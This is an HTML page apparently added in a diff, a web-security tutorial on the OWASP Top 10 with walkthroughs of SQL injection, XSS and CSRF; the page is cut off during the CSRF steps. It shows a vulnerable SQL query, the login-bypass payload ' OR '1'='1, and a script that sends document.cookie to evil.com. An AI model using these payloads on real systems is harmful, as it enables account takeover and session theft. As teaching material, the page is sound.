@@ -1,0 +1,1628 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Complete guide to Web Security Fundamentals - OWASP Top 10, XSS, CSRF, SQL Injection, and how to protect your applications"
+    />
+    <title>Web Security Fundamentals | Technical Reference</title>
+    <link rel="stylesheet" href="styles/main.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      /* Enhanced styles for security page */
+      .hero-section {
+        background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
+        color: white;
+        padding: 4rem 0;
+        text-align: center;
+      }
+
+      .hero-title {
+        font-size: 3.5rem;
+        font-weight: 700;
+        margin-bottom: 1rem;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+      }
+
+      .hero-subtitle {
+        font-size: 1.3rem;
+        opacity: 0.9;
+        max-width: 800px;
+        margin: 0 auto;
+      }
+
+      .vulnerability-card {
+        background: white;
+        border-radius: 15px;
+        padding: 2rem;
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+        border-left: 4px solid #dc2626;
+        margin: 2rem 0;
+        transition: all 0.3s ease;
+      }
+
+      .vulnerability-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+      }
+
+      .attack-flow {
+        background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
+        color: white;
+        padding: 2.5rem;
+        border-radius: 15px;
+        margin: 2rem 0;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+      }
+
+      .attack-diagram {
+        display: grid;
+        grid-template-columns: 1fr auto 1fr auto 1fr;
+        align-items: center;
+        gap: 1.5rem;
+        margin: 2rem 0;
+      }
+
+      .attack-item {
+        background: rgba(255, 255, 255, 0.1);
+        padding: 1.5rem;
+        border-radius: 12px;
+        text-align: center;
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+      }
+
+      .attack-arrow {
+        font-size: 2rem;
+        color: #fbbf24;
+        font-weight: bold;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+      }
+
+      .severity-high {
+        border-left-color: #dc2626;
+        background: #fef2f2;
+      }
+
+      .severity-medium {
+        border-left-color: #f59e0b;
+        background: #fef3c7;
+      }
+
+      .severity-low {
+        border-left-color: #10b981;
+        background: #ecfdf5;
+      }
+
+      .prevention-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 2rem;
+        margin: 2rem 0;
+      }
+
+      .prevention-card {
+        background: #ecfdf5;
+        border: 1px solid #a7f3d0;
+        border-radius: 12px;
+        padding: 2rem;
+        border-left: 4px solid #10b981;
+      }
+
+      @media (max-width: 768px) {
+        .hero-title {
+          font-size: 2.5rem;
+        }
+        .attack-diagram {
+          grid-template-columns: 1fr;
+          gap: 1rem;
+        }
+        .attack-arrow {
+          transform: rotate(90deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Skip to main content for accessibility -->
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <!-- Header -->
+    <header class="header">
+      <div class="container">
+        <div class="header-content">
+          <div class="logo">
+            <h1><a href="index.html">Tech Reference</a></h1>
+          </div>
+          <nav class="nav" aria-label="Main navigation">
+            <ul class="nav-list">
+              <li><a href="index.html" class="nav-link">Home</a></li>
+              <li class="nav-dropdown">
+                <button class="nav-link dropdown-toggle" aria-expanded="false">
+                  Networking
+                  <svg
+                    class="dropdown-icon"
+                    width="16"
+                    height="16"
+                    viewBox="0 0 16 16"
+                    fill="currentColor"
+                  >
+                    <path d="M8 10.5L3.5 6h9L8 10.5z" />
+                  </svg>
+                </button>
+                <ul class="dropdown-menu">
+                  <li><a href="proxy.html" class="dropdown-link">Proxy</a></li>
+                  <li>
+                    <a href="reverse-proxy.html" class="dropdown-link"
+                      >Reverse Proxy</a
+                    >
+                  </li>
+                  <li>
+                    <a href="api-gateway.html" class="dropdown-link"
+                      >API Gateway</a
+                    >
+                  </li>
+                  <li>
+                    <a href="load-balancer-simple.html" class="dropdown-link"
+                      >Load Balancer</a
+                    >
+                  </li>
+                  <li><a href="nginx.html" class="dropdown-link">NGINX</a></li>
+                  <li><a href="dns.html" class="dropdown-link">DNS</a></li>
+                  <li><a href="cdn.html" class="dropdown-link">CDN</a></li>
+                </ul>
+              </li>
+              <li class="nav-dropdown">
+                <button class="nav-link dropdown-toggle" aria-expanded="false">
+                  Web Fundamentals
+                  <svg
+                    class="dropdown-icon"
+                    width="16"
+                    height="16"
+                    viewBox="0 0 16 16"
+                    fill="currentColor"
+                  >
+                    <path d="M8 10.5L3.5 6h9L8 10.5z" />
+                  </svg>
+                </button>
+                <ul class="dropdown-menu">
+                  <li>
+                    <a href="http-https.html" class="dropdown-link"
+                      >HTTP/HTTPS</a
+                    >
+                  </li>
+                  <li>
+                    <a href="backend-frontend.html" class="dropdown-link"
+                      >Backend/Frontend</a
+                    >
+                  </li>
+                  <li>
+                    <a href="encryption.html" class="dropdown-link"
+                      >Encryption</a
+                    >
+                  </li>
+                  <li>
+                    <a href="websockets.html" class="dropdown-link"
+                      >WebSockets</a
+                    >
+                  </li>
+                </ul>
+              </li>
+              <li class="nav-dropdown">
+                <button class="nav-link dropdown-toggle" aria-expanded="false">
+                  Security
+                  <svg
+                    class="dropdown-icon"
+                    width="16"
+                    height="16"
+                    viewBox="0 0 16 16"
+                    fill="currentColor"
+                  >
+                    <path d="M8 10.5L3.5 6h9L8 10.5z" />
+                  </svg>
+                </button>
+                <ul class="dropdown-menu">
+                  <li>
+                    <a href="web-security.html" class="dropdown-link active"
+                      >Web Security</a
+                    >
+                  </li>
+                  <li>
+                    <a href="authentication.html" class="dropdown-link"
+                      >Authentication</a
+                    >
+                  </li>
+                  <li><a href="cors.html" class="dropdown-link">CORS</a></li>
+                </ul>
+              </li>
+              <li class="nav-dropdown">
+                <button class="nav-link dropdown-toggle" aria-expanded="false">
+                  AI/ML
+                  <svg
+                    class="dropdown-icon"
+                    width="16"
+                    height="16"
+                    viewBox="0 0 16 16"
+                    fill="currentColor"
+                  >
+                    <path d="M8 10.5L3.5 6h9L8 10.5z" />
+                  </svg>
+                </button>
+                <ul class="dropdown-menu">
+                  <li>
+                    <a href="llm-simple.html" class="dropdown-link">LLM</a>
+                  </li>
+                  <li>
+                    <a href="fine-tuning-simple.html" class="dropdown-link"
+                      >Fine Tuning</a
+                    >
+                  </li>
+                  <li>
+                    <a href="rag-simple.html" class="dropdown-link">RAG</a>
+                  </li>
+                  <li><a href="mcp.html" class="dropdown-link">MCP</a></li>
+                </ul>
+              </li>
+            </ul>
+          </nav>
+          <button class="mobile-menu-toggle" aria-label="Toggle mobile menu">
+            <span></span>
+            <span></span>
+            <span></span>
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <main id="main-content" class="main">
+      <!-- Hero Section -->
+      <section class="hero-section">
+        <div class="container">
+          <h1 class="hero-title">🛡️ Web Security Fundamentals</h1>
+          <p class="hero-subtitle">
+            Protect your applications from the most common web vulnerabilities.
+            Learn about OWASP Top 10, attack patterns, and defense strategies
+            with practical examples.
+          </p>
+        </div>
+      </section>
+
+      <!-- Content Container -->
+      <div
+        class="container"
+        style="max-width: 1200px; margin: 0 auto; padding: 2rem 1rem"
+      >
+        <!-- Introduction -->
+        <section style="margin: 3rem 0">
+          <h2
+            style="
+              color: #1f2937;
+              font-size: 2.5rem;
+              margin-bottom: 2rem;
+              text-align: center;
+            "
+          >
+            🎯 Why Web Security Matters
+          </h2>
+
+          <div
+            style="
+              background: #f8fafc;
+              padding: 2rem;
+              border-radius: 15px;
+              margin-bottom: 2rem;
+            "
+          >
+            <p
+              style="
+                font-size: 1.2rem;
+                line-height: 1.8;
+                text-align: center;
+                color: #374151;
+              "
+            >
+              Web applications are under constant attack. A single vulnerability
+              can lead to
+              <strong>data breaches</strong>, <strong>financial loss</strong>,
+              and <strong>reputation damage</strong>. Understanding common
+              attack patterns and defense strategies is essential for every
+              developer.
+            </p>
+          </div>
+
+          <!-- Security Statistics -->
+          <div
+            style="
+              display: grid;
+              grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+              gap: 1.5rem;
+              margin: 2rem 0;
+            "
+          >
+            <div
+              style="
+                background: #fef2f2;
+                padding: 1.5rem;
+                border-radius: 10px;
+                border-left: 4px solid #ef4444;
+                text-align: center;
+              "
+            >
+              <h3
+                style="color: #dc2626; margin-bottom: 0.5rem; font-size: 2rem"
+              >
+                43%
+              </h3>
+              <p style="margin: 0; font-size: 0.9rem">
+                of cyberattacks target small businesses
+              </p>
+            </div>
+
+            <div
+              style="
+                background: #fef2f2;
+                padding: 1.5rem;
+                border-radius: 10px;
+                border-left: 4px solid #ef4444;
+                text-align: center;
+              "
+            >
+              <h3
+                style="color: #dc2626; margin-bottom: 0.5rem; font-size: 2rem"
+              >
+                $4.45M
+              </h3>
+              <p style="margin: 0; font-size: 0.9rem">
+                average cost of a data breach
+              </p>
+            </div>
+
+            <div
+              style="
+                background: #fef2f2;
+                padding: 1.5rem;
+                border-radius: 10px;
+                border-left: 4px solid #ef4444;
+                text-align: center;
+              "
+            >
+              <h3
+                style="color: #dc2626; margin-bottom: 0.5rem; font-size: 2rem"
+              >
+                277
+              </h3>
+              <p style="margin: 0; font-size: 0.9rem">
+                days average time to identify a breach
+              </p>
+            </div>
+
+            <div
+              style="
+                background: #fef2f2;
+                padding: 1.5rem;
+                border-radius: 10px;
+                border-left: 4px solid #ef4444;
+                text-align: center;
+              "
+            >
+              <h3
+                style="color: #dc2626; margin-bottom: 0.5rem; font-size: 2rem"
+              >
+                95%
+              </h3>
+              <p style="margin: 0; font-size: 0.9rem">
+                of successful attacks due to human error
+              </p>
+            </div>
+          </div>
+        </section>
+
+        <!-- OWASP Top 10 -->
+        <section style="margin: 4rem 0">
+          <h2
+            style="
+              color: #1f2937;
+              font-size: 2.5rem;
+              margin-bottom: 2rem;
+              text-align: center;
+            "
+          >
+            🔟 OWASP Top 10 Vulnerabilities (2021)
+          </h2>
+
+          <p
+            style="
+              font-size: 1.1rem;
+              margin-bottom: 2rem;
+              color: #6b7280;
+              text-align: center;
+            "
+          >
+            The most critical web application security risks according to the
+            Open Web Application Security Project:
+          </p>
+
+          <!-- Top 10 List -->
+          <div style="display: grid; gap: 1.5rem; margin: 2rem 0">
+            <div class="vulnerability-card severity-high">
+              <h3
+                style="
+                  color: #dc2626;
+                  margin-bottom: 1rem;
+                  display: flex;
+                  align-items: center;
+                  gap: 0.5rem;
+                "
+              >
+                <span
+                  style="
+                    background: #dc2626;
+                    color: white;
+                    width: 30px;
+                    height: 30px;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                  "
+                  >1</span
+                >
+                Broken Access Control
+              </h3>
+              <p style="margin-bottom: 1rem; color: #4b5563">
+                Users can access unauthorized functionality or data. Accounts
+                can be compromised, permissions bypassed.
+              </p>
+              <div
+                style="
+                  background: #f9fafb;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  margin-top: 1rem;
+                "
+              >
+                <strong>Examples:</strong> Direct URL access, privilege
+                escalation, metadata manipulation
+              </div>
+            </div>
+
+            <div class="vulnerability-card severity-high">
+              <h3
+                style="
+                  color: #dc2626;
+                  margin-bottom: 1rem;
+                  display: flex;
+                  align-items: center;
+                  gap: 0.5rem;
+                "
+              >
+                <span
+                  style="
+                    background: #dc2626;
+                    color: white;
+                    width: 30px;
+                    height: 30px;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                  "
+                  >2</span
+                >
+                Cryptographic Failures
+              </h3>
+              <p style="margin-bottom: 1rem; color: #4b5563">
+                Sensitive data transmitted or stored without proper encryption
+                protection.
+              </p>
+              <div
+                style="
+                  background: #f9fafb;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  margin-top: 1rem;
+                "
+              >
+                <strong>Examples:</strong> Plain text passwords, weak
+                encryption, HTTP instead of HTTPS
+              </div>
+            </div>
+
+            <div class="vulnerability-card severity-high">
+              <h3
+                style="
+                  color: #dc2626;
+                  margin-bottom: 1rem;
+                  display: flex;
+                  align-items: center;
+                  gap: 0.5rem;
+                "
+              >
+                <span
+                  style="
+                    background: #dc2626;
+                    color: white;
+                    width: 30px;
+                    height: 30px;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                  "
+                  >3</span
+                >
+                Injection Attacks
+              </h3>
+              <p style="margin-bottom: 1rem; color: #4b5563">
+                Untrusted data sent to interpreters as part of commands or
+                queries.
+              </p>
+              <div
+                style="
+                  background: #f9fafb;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  margin-top: 1rem;
+                "
+              >
+                <strong>Examples:</strong> SQL injection, NoSQL injection, OS
+                command injection, LDAP injection
+              </div>
+            </div>
+
+            <div class="vulnerability-card severity-medium">
+              <h3
+                style="
+                  color: #d97706;
+                  margin-bottom: 1rem;
+                  display: flex;
+                  align-items: center;
+                  gap: 0.5rem;
+                "
+              >
+                <span
+                  style="
+                    background: #d97706;
+                    color: white;
+                    width: 30px;
+                    height: 30px;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                  "
+                  >4</span
+                >
+                Insecure Design
+              </h3>
+              <p style="margin-bottom: 1rem; color: #4b5563">
+                Missing or ineffective control design flaws and architectural
+                weaknesses.
+              </p>
+              <div
+                style="
+                  background: #f9fafb;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  margin-top: 1rem;
+                "
+              >
+                <strong>Examples:</strong> Missing security controls, insecure
+                design patterns
+              </div>
+            </div>
+
+            <div class="vulnerability-card severity-medium">
+              <h3
+                style="
+                  color: #d97706;
+                  margin-bottom: 1rem;
+                  display: flex;
+                  align-items: center;
+                  gap: 0.5rem;
+                "
+              >
+                <span
+                  style="
+                    background: #d97706;
+                    color: white;
+                    width: 30px;
+                    height: 30px;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                  "
+                  >5</span
+                >
+                Security Misconfiguration
+              </h3>
+              <p style="margin-bottom: 1rem; color: #4b5563">
+                Insecure default configurations, incomplete setups, open cloud
+                storage.
+              </p>
+              <div
+                style="
+                  background: #f9fafb;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  margin-top: 1rem;
+                "
+              >
+                <strong>Examples:</strong> Default accounts, unnecessary
+                features enabled, verbose error messages
+              </div>
+            </div>
+
+            <div class="vulnerability-card severity-medium">
+              <h3
+                style="
+                  color: #d97706;
+                  margin-bottom: 1rem;
+                  display: flex;
+                  align-items: center;
+                  gap: 0.5rem;
+                "
+              >
+                <span
+                  style="
+                    background: #d97706;
+                    color: white;
+                    width: 30px;
+                    height: 30px;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                  "
+                  >6</span
+                >
+                Vulnerable Components
+              </h3>
+              <p style="margin-bottom: 1rem; color: #4b5563">
+                Using components with known vulnerabilities or outdated
+                versions.
+              </p>
+              <div
+                style="
+                  background: #f9fafb;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  margin-top: 1rem;
+                "
+              >
+                <strong>Examples:</strong> Outdated libraries, unpatched
+                frameworks, unused dependencies
+              </div>
+            </div>
+
+            <div class="vulnerability-card severity-medium">
+              <h3
+                style="
+                  color: #d97706;
+                  margin-bottom: 1rem;
+                  display: flex;
+                  align-items: center;
+                  gap: 0.5rem;
+                "
+              >
+                <span
+                  style="
+                    background: #d97706;
+                    color: white;
+                    width: 30px;
+                    height: 30px;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                  "
+                  >7</span
+                >
+                Authentication Failures
+              </h3>
+              <p style="margin-bottom: 1rem; color: #4b5563">
+                Application functions related to authentication and session
+                management are implemented incorrectly.
+              </p>
+              <div
+                style="
+                  background: #f9fafb;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  margin-top: 1rem;
+                "
+              >
+                <strong>Examples:</strong> Weak passwords, session fixation,
+                missing MFA
+              </div>
+            </div>
+
+            <div class="vulnerability-card severity-low">
+              <h3
+                style="
+                  color: #059669;
+                  margin-bottom: 1rem;
+                  display: flex;
+                  align-items: center;
+                  gap: 0.5rem;
+                "
+              >
+                <span
+                  style="
+                    background: #059669;
+                    color: white;
+                    width: 30px;
+                    height: 30px;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                  "
+                  >8</span
+                >
+                Software Integrity Failures
+              </h3>
+              <p style="margin-bottom: 1rem; color: #4b5563">
+                Code and infrastructure that do not protect against integrity
+                violations.
+              </p>
+              <div
+                style="
+                  background: #f9fafb;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  margin-top: 1rem;
+                "
+              >
+                <strong>Examples:</strong> Unsigned software updates, insecure
+                CI/CD pipelines
+              </div>
+            </div>
+
+            <div class="vulnerability-card severity-low">
+              <h3
+                style="
+                  color: #059669;
+                  margin-bottom: 1rem;
+                  display: flex;
+                  align-items: center;
+                  gap: 0.5rem;
+                "
+              >
+                <span
+                  style="
+                    background: #059669;
+                    color: white;
+                    width: 30px;
+                    height: 30px;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                  "
+                  >9</span
+                >
+                Logging Failures
+              </h3>
+              <p style="margin-bottom: 1rem; color: #4b5563">
+                Insufficient logging and monitoring, coupled with missing or
+                ineffective integration.
+              </p>
+              <div
+                style="
+                  background: #f9fafb;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  margin-top: 1rem;
+                "
+              >
+                <strong>Examples:</strong> Missing security logs, inadequate log
+                protection, slow incident response
+              </div>
+            </div>
+
+            <div class="vulnerability-card severity-low">
+              <h3
+                style="
+                  color: #059669;
+                  margin-bottom: 1rem;
+                  display: flex;
+                  align-items: center;
+                  gap: 0.5rem;
+                "
+              >
+                <span
+                  style="
+                    background: #059669;
+                    color: white;
+                    width: 30px;
+                    height: 30px;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                  "
+                  >10</span
+                >
+                Server-Side Request Forgery (SSRF)
+              </h3>
+              <p style="margin-bottom: 1rem; color: #4b5563">
+                Web application fetches remote resources without validating
+                user-supplied URLs.
+              </p>
+              <div
+                style="
+                  background: #f9fafb;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  margin-top: 1rem;
+                "
+              >
+                <strong>Examples:</strong> Internal service access, cloud
+                metadata access, port scanning
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- SQL Injection Deep Dive -->
+        <section style="margin: 4rem 0">
+          <h2
+            style="
+              color: #1f2937;
+              font-size: 2.5rem;
+              margin-bottom: 2rem;
+              text-align: center;
+            "
+          >
+            💉 SQL Injection Attack Flow
+          </h2>
+
+          <p
+            style="
+              font-size: 1.1rem;
+              margin-bottom: 2rem;
+              color: #6b7280;
+              text-align: center;
+            "
+          >
+            The most common injection attack - here's exactly how it works:
+          </p>
+
+          <!-- SQL Injection Attack Flow -->
+          <div class="attack-flow">
+            <h3
+              style="text-align: center; margin-bottom: 2rem; font-size: 1.8rem"
+            >
+              🎯 SQL Injection Attack Process
+            </h3>
+
+            <div class="attack-diagram">
+              <div class="attack-item">
+                <div style="font-size: 2.5rem; margin-bottom: 1rem">👤</div>
+                <h4>Attacker</h4>
+                <p style="margin: 0; font-size: 0.9rem">
+                  Crafts malicious input
+                </p>
+              </div>
+
+              <div class="attack-arrow">→</div>
+
+              <div class="attack-item">
+                <div style="font-size: 2.5rem; margin-bottom: 1rem">🌐</div>
+                <h4>Web Form</h4>
+                <p style="margin: 0; font-size: 0.9rem">Accepts user input</p>
+              </div>
+
+              <div class="attack-arrow">→</div>
+
+              <div class="attack-item">
+                <div style="font-size: 2.5rem; margin-bottom: 1rem">🗄️</div>
+                <h4>Database</h4>
+                <p style="margin: 0; font-size: 0.9rem">
+                  Executes malicious query
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <!-- Step-by-Step SQL Injection -->
+          <div class="step-flow">
+            <div class="step-item">
+              <div class="step-number">1</div>
+              <div>
+                <h3 style="color: #2563eb; margin-bottom: 0.5rem">
+                  Vulnerable Code
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Application uses unsanitized user input in SQL queries
+                </p>
+                <div class="code-example">
+                  # ❌ VULNERABLE CODE<br />
+                  username = request.form['username']<br />
+                  password = request.form['password']<br />
+                  <br />
+                  query = f"SELECT * FROM users WHERE username='{username}' AND
+                  password='{password}'"<br />
+                  result = db.execute(query)
+                </div>
+              </div>
+            </div>
+
+            <div class="step-item">
+              <div class="step-number">2</div>
+              <div>
+                <h3 style="color: #2563eb; margin-bottom: 0.5rem">
+                  Malicious Input
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Attacker enters SQL code instead of normal data
+                </p>
+                <div class="code-example">
+                  Username: admin<br />
+                  Password: <span style="color: #ef4444">' OR '1'='1</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="step-item">
+              <div class="step-number">3</div>
+              <div>
+                <h3 style="color: #2563eb; margin-bottom: 0.5rem">
+                  Constructed Query
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  The malicious input becomes part of the SQL query
+                </p>
+                <div class="code-example">
+                  SELECT * FROM users WHERE username='admin' AND password='<span
+                    style="color: #ef4444"
+                    >' OR '1'='1</span
+                  >'
+                </div>
+              </div>
+            </div>
+
+            <div class="step-item">
+              <div class="step-number">4</div>
+              <div>
+                <h3 style="color: #ef4444; margin-bottom: 0.5rem">
+                  Successful Attack
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Query always returns true, bypassing authentication
+                </p>
+                <div
+                  style="
+                    background: #fef2f2;
+                    padding: 1rem;
+                    border-radius: 8px;
+                    border-left: 4px solid #ef4444;
+                  "
+                >
+                  <strong>Result:</strong> Attacker gains unauthorized access to
+                  admin account!
+                </div>
+              </div>
+            </div>
+
+            <div class="step-item">
+              <div class="step-number">5</div>
+              <div>
+                <h3 style="color: #10b981; margin-bottom: 0.5rem">
+                  ✅ Secure Solution
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Use parameterized queries (prepared statements)
+                </p>
+                <div class="code-example">
+                  # ✅ SECURE CODE<br />
+                  query = "SELECT * FROM users WHERE username=? AND
+                  password=?"<br />
+                  result = db.execute(query, [username, password])
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- XSS Attack Flow -->
+        <section style="margin: 4rem 0">
+          <h2
+            style="
+              color: #1f2937;
+              font-size: 2.5rem;
+              margin-bottom: 2rem;
+              text-align: center;
+            "
+          >
+            🔗 Cross-Site Scripting (XSS) Attack
+          </h2>
+
+          <p
+            style="
+              font-size: 1.1rem;
+              margin-bottom: 2rem;
+              color: #6b7280;
+              text-align: center;
+            "
+          >
+            Malicious scripts executed in victim's browser - here's how it
+            happens:
+          </p>
+
+          <!-- XSS Types -->
+          <div
+            style="
+              display: grid;
+              grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+              gap: 2rem;
+              margin: 2rem 0;
+            "
+          >
+            <div
+              style="
+                background: #fef2f2;
+                border: 1px solid #fca5a5;
+                border-radius: 12px;
+                padding: 2rem;
+              "
+            >
+              <h3 style="color: #dc2626; margin-bottom: 1rem">🔴 Stored XSS</h3>
+              <p style="margin-bottom: 1rem; font-size: 0.9rem">
+                Malicious script stored on server (database, comments, etc.)
+              </p>
+              <div class="code-example" style="font-size: 0.8rem">
+                Comment: &lt;script&gt;alert('XSS')&lt;/script&gt;
+              </div>
+            </div>
+
+            <div
+              style="
+                background: #fef3c7;
+                border: 1px solid #fcd34d;
+                border-radius: 12px;
+                padding: 2rem;
+              "
+            >
+              <h3 style="color: #d97706; margin-bottom: 1rem">
+                🟡 Reflected XSS
+              </h3>
+              <p style="margin-bottom: 1rem; font-size: 0.9rem">
+                Malicious script reflected from URL parameters
+              </p>
+              <div class="code-example" style="font-size: 0.8rem">
+                ?search=&lt;script&gt;alert('XSS')&lt;/script&gt;
+              </div>
+            </div>
+
+            <div
+              style="
+                background: #f3f4f6;
+                border: 1px solid #d1d5db;
+                border-radius: 12px;
+                padding: 2rem;
+              "
+            >
+              <h3 style="color: #6b7280; margin-bottom: 1rem">⚫ DOM XSS</h3>
+              <p style="margin-bottom: 1rem; font-size: 0.9rem">
+                Client-side script modifies DOM unsafely
+              </p>
+              <div class="code-example" style="font-size: 0.8rem">
+                document.innerHTML = userInput
+              </div>
+            </div>
+          </div>
+
+          <!-- XSS Attack Steps -->
+          <div class="step-flow">
+            <div class="step-item">
+              <div class="step-number">1</div>
+              <div>
+                <h3 style="color: #2563eb; margin-bottom: 0.5rem">
+                  Vulnerable Page
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Web page accepts and displays user input without sanitization
+                </p>
+                <div class="code-example">
+                  # ❌ VULNERABLE CODE<br />
+                  &lt;div&gt;Welcome ${user_input}!&lt;/div&gt;
+                </div>
+              </div>
+            </div>
+
+            <div class="step-item">
+              <div class="step-number">2</div>
+              <div>
+                <h3 style="color: #2563eb; margin-bottom: 0.5rem">
+                  Malicious Payload
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Attacker injects JavaScript code
+                </p>
+                <div class="code-example">
+                  Input:
+                  &lt;script&gt;document.location='http://evil.com/steal?cookie='+document.cookie&lt;/script&gt;
+                </div>
+              </div>
+            </div>
+
+            <div class="step-item">
+              <div class="step-number">3</div>
+              <div>
+                <h3 style="color: #2563eb; margin-bottom: 0.5rem">
+                  Script Execution
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Malicious script runs in victim's browser
+                </p>
+                <div
+                  style="
+                    background: #fef2f2;
+                    padding: 1rem;
+                    border-radius: 8px;
+                    border-left: 4px solid #ef4444;
+                  "
+                >
+                  <strong>Impact:</strong> Cookie theft, session hijacking,
+                  account takeover
+                </div>
+              </div>
+            </div>
+
+            <div class="step-item">
+              <div class="step-number">4</div>
+              <div>
+                <h3 style="color: #10b981; margin-bottom: 0.5rem">
+                  ✅ Prevention
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Sanitize and escape all user input
+                </p>
+                <div class="code-example">
+                  # ✅ SECURE CODE<br />
+                  import html<br />
+                  safe_input = html.escape(user_input)<br />
+                  &lt;div&gt;Welcome ${safe_input}!&lt;/div&gt;
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- CSRF Attack Flow -->
+        <section style="margin: 4rem 0">
+          <h2
+            style="
+              color: #1f2937;
+              font-size: 2.5rem;
+              margin-bottom: 2rem;
+              text-align: center;
+            "
+          >
+            🎭 Cross-Site Request Forgery (CSRF)
+          </h2>
+
+          <p
+            style="
+              font-size: 1.1rem;
+              margin-bottom: 2rem;
+              color: #6b7280;
+              text-align: center;
+            "
+          >
+            Tricking users into performing unwanted actions while authenticated:
+          </p>
+
+          <!-- CSRF Attack Diagram -->
+          <div class="attack-flow">
+            <h3
+              style="text-align: center; margin-bottom: 2rem; font-size: 1.8rem"
+            >
+              🎯 CSRF Attack Scenario
+            </h3>
+
+            <div
+              style="
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                gap: 1rem;
+              "
+            >
+              <div
+                style="
+                  background: rgba(255, 255, 255, 0.1);
+                  padding: 1rem;
+                  border-radius: 8px;
+                  text-align: center;
+                "
+              >
+                <div
+                  style="
+                    color: #fbbf24;
+                    font-size: 1.5rem;
+                    margin-bottom: 0.5rem;
+                  "
+                >
+                  1
+                </div>
+                <strong>User Login</strong>
+                <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem">
+                  Authentic login to bank
+                </p>
+              </div>
+
+              <div
+                style="
+                  background: rgba(255, 255, 255, 0.1);
+                  padding: 1rem;
+                  border-radius: 8px;
+                  text-align: center;
+                "
+              >
+                <div
+                  style="
+                    color: #fbbf24;
+                    font-size: 1.5rem;
+                    margin-bottom: 0.5rem;
+                  "
+                >
+                  2
+                </div>
+                <strong>Malicious Site</strong>
+                <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem">
+                  User visits evil.com
+                </p>
+              </div>
+
+              <div
+                style="
+                  background: rgba(255, 255, 255, 0.1);
+                  padding: 1rem;
+                  border-radius: 8px;
+                  text-align: center;
+                "
+              >
+                <div
+                  style="
+                    color: #fbbf24;
+                    font-size: 1.5rem;
+                    margin-bottom: 0.5rem;
+                  "
+                >
+                  3
+                </div>
+                <strong>Hidden Request</strong>
+                <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem">
+                  Form auto-submits
+                </p>
+              </div>
+
+              <div
+                style="
+                  background: rgba(255, 255, 255, 0.1);
+                  padding: 1rem;
+                  border-radius: 8px;
+                  text-align: center;
+                "
+              >
+                <div
+                  style="
+                    color: #fbbf24;
+                    font-size: 1.5rem;
+                    margin-bottom: 0.5rem;
+                  "
+                >
+                  4
+                </div>
+                <strong>Money Transfer</strong>
+                <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem">
+                  Unwanted action executed
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div class="step-flow">
+            <div class="step-item">
+              <div class="step-number">1</div>
+              <div>
+                <h3 style="color: #2563eb; margin-bottom: 0.5rem">
